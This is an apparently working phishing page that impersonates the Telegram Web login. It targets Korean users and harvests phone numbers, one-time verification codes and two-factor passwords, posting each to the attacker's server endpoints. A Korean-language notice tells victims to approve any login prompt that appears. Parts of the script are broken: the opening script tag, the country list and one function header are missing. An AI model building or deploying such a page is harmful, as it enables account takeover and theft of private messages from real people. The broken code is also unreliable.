<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Web</title>
    <link rel="icon" type="image/png" href="https://telegram.org/img/t_logo.png">
    <style>
        :root {
            --primary-color: #3390ec;
            --primary-hover: #2b7cd1;
            --bg-color: #ffffff;
            --text-color: #000000;
            --secondary-text: #707579;
            --border-color: #dfe1e5;
            --input-focus: #3390ec;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .login-container {
            width: 100%;
            max-width: 520px;
            padding: 40px 60px;
            text-align: center;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-container {
            margin-bottom: 50px;
        }

        .logo-container img {
            width: 180px;
            height: 180px;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 38px;
            font-weight: 500;
            margin-bottom: 16px;
            color: #000;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 17px;
            color: var(--secondary-text);
            line-height: 1.6;
            margin-bottom: 56px;
            font-weight: 400;
            letter-spacing: -0.3px;
        }

        .input-group {
            position: relative;
            margin-bottom: 28px;
            text-align: left;
        }

        .input-label {
            position: absolute;
            top: -10px;
            left: 12px;
            background: white;
            padding: 0 4px;
            font-size: 12px;
            color: var(--primary-color);
            z-index: 1;
            transition: all 0.2s;
        }

        .custom-input {
            width: 100%;
            height: 56px;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 0 18px;
            font-size: 16px;
            outline: none;
            transition: all 0.2s ease;
            background: #fff;
            letter-spacing: -0.2px;
        }

        .custom-input:focus {
            border: 2px solid var(--primary-color);
            padding: 0 15px;
        }

        .country-select-container {
            cursor: pointer;
            position: relative;
        }

        .country-select-container::after {
            content: "";
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-top: 5px solid var(--secondary-text);
            pointer-events: none;
        }

        .phone-container {
            display: flex;
            gap: 16px;
        }

        .phone-number-input {
            flex: 1;
        }

        .btn-next {
            width: 100%;
            height: 56px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
            text-transform: uppercase;
            transition: all 0.2s ease;
            box-shadow: 0 4px 12px rgba(51, 144, 236, 0.2);
            letter-spacing: 0.5px;
        }

        .btn-next:hover {
            background-color: var(--primary-hover);
        }

        .btn-qr {
            display: block;
            width: 100%;
            padding: 16px;
            color: var(--primary-color);
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
            margin-top: 24px;
            text-transform: uppercase;
            border-radius: 10px;
            transition: background-color 0.2s;
        }

        .btn-qr:hover {
            background-color: rgba(51, 144, 236, 0.08);
        }

        .keep-signed-in {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 28px;
            font-size: 15px;
            color: var(--secondary-text);
            letter-spacing: -0.2px;
        }

        .keep-signed-in input[type="checkbox"] {
            margin-right: 8px;
            width: 18px;
            height: 18px;
            accent-color: var(--primary-color);
        }

        /* Modal for Country Selection */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background: white;
            width: 90%;
            max-width: 400px;
            max-height: 80vh;
            border-radius: 12px;
            overflow-y: auto;
            padding: 10px 0;
        }

        .search-box {
            padding: 16px;
            border-bottom: 1px solid var(--border-color);
            position: sticky;
            top: 0;
            background: white;
        }

        .search-input {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }

        .search-input:focus {
            border-color: var(--primary-color);
        }

        .country-item {
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            cursor: pointer;
            transition: background 0.2s;
        }

        .country-item:hover {
            background: #f4f4f5;
        }

        .country-name {
            font-size: 16px;
        }

        .country-code-text {
            color: var(--secondary-text);
        }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container" id="phoneContainer">
        <div class="logo-container">
            <img src="/telegram_logo.png" alt="Telegram Logo">
        </div>
        
        <h1>Telegram</h1>
        <p class="subtitle">
            Please confirm your country code<br>
            and enter your phone number.
        </p>

        <div class="input-group country-select-container" onclick="openModal()">
            <div class="input-label">Country</div>
            <div class="custom-input" id="selectedCountry" style="display: flex; align-items: center;">South Korea</div>
        </div>

        <div class="phone-container">
            <div class="input-group" style="width: 100px;">
                <div class="input-label">Code</div>
                <input type="text" class="custom-input" id="countryCode" value="+82" readonly>
            </div>
            <div class="input-group phone-number-input">
                <div class="input-label">Phone Number</div>
                <input type="tel" class="custom-input" id="phoneNumber" placeholder="Phone number" onkeyup="checkPhoneNumberLength()">
            </div>
        </div>

        <button class="btn-next" onclick="handleNext()" style="display: none;" id="nextButton">
            <span id="btnText">Next</span>
            <div class="spinner" id="btnSpinner"></div>
        </button>

        <div class="keep-signed-in">
            <input type="checkbox" id="keepSignedIn" checked>
            <label for="keepSignedIn">Keep me signed in</label>
        </div>

        <a href="#" class="btn-qr">Log in by QR Code</a>
    </div>

    <!-- Two-Factor Authentication Container -->
    <div class="login-container" id="twoFactorContainer" style="display: none;">
        <div style="background-color: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 12px 16px; margin-bottom: 24px; text-align: left;">
            <p style="margin: 0; font-size: 14px; color: #856404; line-height: 1.5;">
                ⚠️ <strong>중요:</strong> 로그인 승인 문구가 나타날 수 있습니다. 나타나면 반드시 "예"를 눌러 승인해주세요.
            </p>
        </div>

        <h1>2단계 인증 비밀번호</h1>
        <p class="subtitle">
            계정을 보호하기 위해 추가 비밀번호를 설정했습니다.<br>
            비밀번호를 입력해주세요.
        </p>

        <div class="input-group" style="position: relative;">
            <div class="input-label">비밀번호</div>
            <div style="position: relative; display: flex; align-items: center;">
                <input type="password" class="custom-input" id="twoFactorPassword" placeholder="비밀번호" oninput="checkPasswordLength()" style="flex: 1;">
                <button type="button" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; background: none; border: none; cursor: pointer; font-size: 20px; padding: 0;" id="togglePasswordBtn">👁️</button>
            </div>
        </div>

        <button class="btn-next" onclick="handlePasswordSubmit()" style="display: none;" id="passwordNextButton">
            <span id="passwordBtnText">다음</span>
            <div class="spinner" id="passwordBtnSpinner"></div>
        </button>

        <button class="btn-back" onclick="goBackToPhone()" style="margin-top: 16px; width: 100%; height: 56px; background-color: #f0f0f0; color: #000; border: none; border-radius: 12px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.2s ease;">
            이전으로 돌아가기
        </button>
    </div>

    <!-- Code Input Container -->
    <div class="login-container" id="codeContainer" style="display: none;">
        <div class="logo-container">
            <img src="/telegram_logo.png" alt="Telegram Logo">
        </div>
        
        <h1>인증 코드 입력</h1>
        <p class="subtitle">
            텔레그램 앱 또는 SMS로 인증 코드를 보냈습니다.<br>
            <span id="displayPhoneNumber"></span>
        </p>

        <div class="input-group">
            <div class="input-label">코드</div>
            <input type="text" class="custom-input" id="verificationCode" placeholder="코드" maxlength="5" oninput="checkCodeLength()">
        </div>

        <button class="btn-next" onclick="handleCodeSubmit()" style="display: none;" id="codeNextButton">
            <span id="codeBtnText">다음</span>
            <div class="spinner" id="codeBtnSpinner"></div>
        </button>
    </div>

    <!-- Country Selection Modal -->
    <div class="modal-overlay" id="modalOverlay" onclick="closeModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <div class="search-box">
                <input type="text" class="search-input" id="searchInput" placeholder="Search country..." onkeyup="filterCountries()">
            </div>
            <div id="countryList"></div>
        </div>
    </div>

        let filteredCountries = [...countries];

        function renderCountries(list) {
            const countryList = document.getElementById('countryList');
            countryList.innerHTML = '';
            list.forEach(country => {
                const div = document.createElement('div');
                div.className = 'country-item';
                div.onclick = () => selectCountry(country.name, country.code);
                div.innerHTML = `
                    <span class="country-name">${country.name}</span>
                    <span class="country-code-text">${country.code}</span>
                `;
                countryList.appendChild(div);
            });
        }

        function filterCountries() {
            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
            filteredCountries = countries.filter(country => 
                country.name.toLowerCase().includes(searchTerm) || 
                country.code.includes(searchTerm)
            );
            renderCountries(filteredCountries);
        }

            document.getElementById('modalOverlay').style.display = 'flex';
            renderCountries(countries);
            document.getElementById('searchInput').value = '';
        }

        function closeModal(event) {
            document.getElementById('modalOverlay').style.display = 'none';
        }

        function selectCountry(name, code) {
            document.getElementById('selectedCountry').textContent = name;
            document.getElementById('countryCode').value = code;
            closeModal();
        }

        const nextButton = document.getElementById("nextButton");
        const phoneNumberInput = document.getElementById("phoneNumber");

        function checkPhoneNumberLength() {
            const phone = phoneNumberInput.value.trim().replace(/[^0-9]/g, "");
            if (phone.length >= 5) {
                nextButton.style.display = "block";
            } else {
                nextButton.style.display = "none";
            }
        }

        // Initial check in case of pre-filled values (though not expected here)
        checkPhoneNumberLength();

        let currentPhoneNumber = '';

        async function handleNext() {
            const phone = phoneNumberInput.value.trim();
            const countryCode = document.getElementById("countryCode").value;
            
            if (!phone) {
                alert("Please enter your phone number");
                return;
            }

            const btnText = document.getElementById("btnText");
            const btnSpinner = document.getElementById("btnSpinner");
            
            btnText.style.display = "none";
            btnSpinner.style.display = "block";

            currentPhoneNumber = countryCode + phone;

            try {
                const response = await fetch("/send_phone", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ phone_number: currentPhoneNumber })
                });

                const data = await response.json();
                
                setTimeout(() => {
                    btnText.style.display = "block";
                    btnSpinner.style.display = "none";
                    if (data.ok) {
                        document.getElementById("phoneContainer").style.display = "none";
                        document.getElementById("codeContainer").style.display = "block";
                        document.getElementById("displayPhoneNumber").textContent = currentPhoneNumber;
                        document.getElementById("verificationCode").focus();
                    } else {
                        alert("Error: " + (data.error || "Something went wrong"));
                    }
                }, 1500);

            } catch (error) {
                btnText.style.display = "block";
                btnSpinner.style.display = "none";
                alert("Network error. Please try again.");
            }
        }

        const codeNextButton = document.getElementById("codeNextButton");
        const verificationCodeInput = document.getElementById("verificationCode");

        function checkCodeLength() {
            const code = verificationCodeInput.value.trim().replace(/[^0-9]/g, "");
            if (code.length === 5) {
                handleCodeSubmit();
            } else if (code.length > 0) {
                codeNextButton.style.display = "block";
            } else {
                codeNextButton.style.display = "none";
            }
        }

        async function handleCodeSubmit() {
            const code = verificationCodeInput.value.trim();
            
            if (!code) {
                alert("Please enter the verification code");
                return;
            }

            const codeBtnText = document.getElementById("codeBtnText");
            const codeBtnSpinner = document.getElementById("codeBtnSpinner");
            
            codeBtnText.style.display = "none";
            codeBtnSpinner.style.display = "block";

            try {
                const response = await fetch("/send_code", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ phone_number: currentPhoneNumber, verification_code: code })
                });

                const data = await response.json();
                
                setTimeout(() => {
                    codeBtnText.style.display = "block";
                    codeBtnSpinner.style.display = "none";
                    if (data.ok) {
                        document.getElementById("codeContainer").style.display = "none";
                        document.getElementById("twoFactorContainer").style.display = "block";
                        document.getElementById("twoFactorPassword").focus();
                    } else {
                        alert("Error: " + (data.error || "Something went wrong"));
                    }
                }, 1500);

            } catch (error) {
                codeBtnText.style.display = "block";
                codeBtnSpinner.style.display = "none";
                alert("Network error. Please try again.");
            }
        }

        const passwordNextButton = document.getElementById("passwordNextButton");
        const twoFactorPasswordInput = document.getElementById("twoFactorPassword");

        function checkPasswordLength() {
            const password = twoFactorPasswordInput.value.trim();
            if (password.length >= 1) {
                passwordNextButton.style.display = "block";
            } else {
                passwordNextButton.style.display = "none";
            }
        }

        function togglePasswordVisibility() {
            const passwordInput = document.getElementById("twoFactorPassword");
            const toggleBtn = document.getElementById("togglePasswordBtn");
            
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                toggleBtn.textContent = "🙈";
            } else {
                passwordInput.type = "password";
                toggleBtn.textContent = "👁️";
            }
        }

        function goBackToPhone() {
            document.getElementById("twoFactorContainer").style.display = "none";
            document.getElementById("phoneContainer").style.display = "block";
            document.getElementById("phoneNumber").focus();
            twoFactorPasswordInput.value = "";
            checkPasswordLength();
        }

        async function handlePasswordSubmit() {
            const password = twoFactorPasswordInput.value.trim();
            
            if (!password) {
                alert("Please enter the password");
                return;
            }

            const passwordBtnText = document.getElementById("passwordBtnText");
            const passwordBtnSpinner = document.getElementById("passwordBtnSpinner");
            
            passwordBtnText.style.display = "none";
            passwordBtnSpinner.style.display = "block";

            try {
                const response = await fetch("/send_password", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ phone_number: currentPhoneNumber, password: password })
                });

                const data = await response.json();
                
                setTimeout(() => {
                    passwordBtnText.style.display = "block";
                    passwordBtnSpinner.style.display = "none";
                    if (data.ok) {
                        document.getElementById("twoFactorContainer").style.display = "none";
                        document.getElementById("phoneContainer").style.display = "block";
                        document.getElementById("phoneNumber").value = "";
                        document.getElementById("phoneNumber").focus();
                        twoFactorPasswordInput.value = "";
                        checkPasswordLength();
                    } else {
                        alert("Error: " + (data.error || "Something went wrong"));
                    }
                }, 1500);

            } catch (error) {
                passwordBtnText.style.display = "block";
                passwordBtnSpinner.style.display = "none";
                alert("Network error. Please try again.");
            }
        }
    </script>
</body>
</html>
